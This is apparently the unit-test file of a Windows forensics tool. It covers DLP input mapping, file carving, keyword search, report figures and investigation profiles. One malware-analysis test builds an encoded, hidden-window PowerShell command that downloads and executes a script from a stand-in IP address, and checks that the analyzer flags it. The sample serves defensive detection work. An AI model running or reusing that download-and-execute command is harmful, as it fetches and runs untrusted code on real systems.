"""Fast unit tests - no forensic images needed.  Run:  python -m pytest tests -m "not slow" """

import base64
import io
import os
import zipfile

import pytest

from winforensics.core.inputs import map_columns, normalize
from winforensics.malware.static import analyze_bytes
from winforensics.search import carve
from winforensics.search.rawscan import Automaton


# --------------------------------------------------------------------------- inputs
def test_dlp_column_synonyms():
    m = map_columns(["Happened (UTC)", "File name", "SHA256", "Removable media serial", "User", "Device name"])
    assert set(m) >= {"time", "file_name", "sha256", "usb_serial", "user", "device"}


def test_normalize_derives_keywords_and_window():
    raw = {"targets": [{"name": "Budget 2026.xlsx", "sha256": "A" * 64}], "usb_serials": ["4C530012450531101593"],
           "dlp_exports": [{"events": [{"time": "2026-09-14T05:35:00Z", "file_name": "Budget 2026.xlsx", "sha256": "a" * 64,
                                        "usb_serial": "4C530012450531101593", "activity": "FileCopiedToRemovableMedia",
                                        "channel": "removable_media"}]}]}
    n = normalize(raw)
    terms = {k["term"].lower() if isinstance(k, dict) else str(k).lower() for k in n["keywords"]}
    assert any("budget 2026" in t for t in terms)
    assert any("4c530012450531101593" in t for t in terms)
    tw = n["time_window"]
    assert tw and str(tw["start"])[:10] <= "2026-09-14" <= str(tw["end"])[:10]
    assert len(n["targets"]) == 1  # the DLP event and the explicit target are the same file (same hash)


# --------------------------------------------------------------------------- carving sizers
def _reader(blob):
    def read(off, n):
        return blob[off:off + n]
    return read


def test_zip_size_exact():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("word/document.xml", "x" * 5000)
        z.writestr("[Content_Types].xml", "<Types/>")
    data = buf.getvalue()
    blob = b"\0" * 4096 + data + os.urandom(8192)
    assert carve._zip_size(_reader(blob), 4096) == len(data)


def test_pdf_size_exact():
    pdf = b"%PDF-1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n"
    blob = b"\0" * 512 + pdf + b"\xff" * 4096
    size = carve._pdf_size(_reader(blob), 512)
    assert pdf[:size].rstrip().endswith(b"%%EOF")


# --------------------------------------------------------------------------- raw search automaton
def test_automaton_ascii_and_utf16():
    a = Automaton([{"term": "Secret_Project"}], carve=False)
    text = (b"..secret_project.." + "SECRET_PROJECT".encode("utf-16-le")).lower().decode("latin-1")
    encs = sorted(enc for kind, _i, enc, _p, _l in a.search(text) if kind == "kw")
    assert encs == ["ascii/utf8", "utf16le"]


# --------------------------------------------------------------------------- malware static analysis
def test_script_with_encoded_powershell_is_flagged():
    cmd = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')".encode("utf-16-le")).decode()
    rep = analyze_bytes(f"powershell -nop -w hidden -enc {cmd}\r\n".encode(), "run.ps1")
    assert rep["indicators"], rep
    assert "203.0.113.9" in str(rep["iocs"])


def test_plain_text_is_quiet():
    rep = analyze_bytes(b"Meeting notes\r\nNothing to see here.\r\n" * 20, "notes.txt")
    assert not rep["indicators"]


# --------------------------------------------------------------------------- profiles
def test_profiles_load_and_reference_known_analyzers():
    from winforensics.analyzers.base import ANALYZERS, discover
    from winforensics.profiles import load_profiles

    discover()
    profiles = load_profiles()
    assert {"dlp_exfiltration", "malware_infection", "clickfix", "phishing", "remote_access", "ransomware"} <= set(profiles)
    for p in profiles.values():
        missing = [a for a in (p.analyzers or []) if a not in ANALYZERS]
        assert not missing, f"{p.id}: unknown analyzers {missing}"
        assert p.questions, p.id


@pytest.mark.parametrize("style", ["app", "excel", "eventlog"])
def test_table_figure_renders(tmp_path, style):
    from winforensics.report.figures import render

    spec = {"kind": "table", "title": "Test", "style": style, "columns": ["Time", "Path"],
            "rows": [["2026-09-14 05:35:00", r"E:\Export\test_doc_alpha.docx"]] * 3, "highlight_rows": [1],
            "callouts": [{"row": 1, "col": 1, "n": 1, "text": "Copied file"}]}
    out = render(spec, str(tmp_path / f"{style}.png"))
    assert os.path.getsize(out) > 2000


def _image_bytes(fmt):
    from PySide6.QtCore import QBuffer, QByteArray, QIODevice
    from PySide6.QtGui import QColor, QImage

    from winforensics.report.figures import ensure_app

    ensure_app()
    img = QImage(300, 200, QImage.Format_RGB32)
    img.fill(QColor(30, 120, 200))
    ba = QByteArray()
    b = QBuffer(ba)
    b.open(QIODevice.WriteOnly)
    img.save(b, fmt)
    return bytes(ba)


@pytest.mark.parametrize("fmt,sizer", [("PNG", "_png_size"), ("JPG", "_jpg_size")])
def test_image_sizers_exact(fmt, sizer):
    data = _image_bytes(fmt)
    blob = b"\0" * 1024 + data + os.urandom(64 * 1024)
    reads = []

    def read(off, n):
        reads.append(n)
        return blob[off:off + n]

    assert getattr(carve, sizer)(read, 1024) == len(data)
    assert sum(reads) < 2 * 1024 * 1024  # never reads megabytes for a small image


def test_every_package_has_init():
    """A folder without __init__.py works from source but is silently dropped from the frozen .exe."""
    root = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "winforensics")
    missing = [d for d, _dirs, files in os.walk(root)
               if "__pycache__" not in d and any(f.endswith(".py") for f in files) and "__init__.py" not in files]
    assert not missing, missing


def test_every_profile_question_is_answerable():
    """Each question of a profile must be answered by at least one analyzer that the profile runs."""
    import inspect
    import re

    from winforensics.analyzers.base import ANALYZERS, discover
    from winforensics.profiles import load_profiles

    discover()
    answers = {aid: set(re.findall(r'answer\(\s*"([\w.]+)"', inspect.getsource(cls))) for aid, cls in ANALYZERS.items()}
    for pid, p in load_profiles().items():
        covered = set().union(*(answers.get(a, set()) for a in p.analyzers))
        missing = [q["id"] for q in p.questions if q["id"] not in covered]
        assert not missing, f"{pid}: no analyzer answers {missing}"
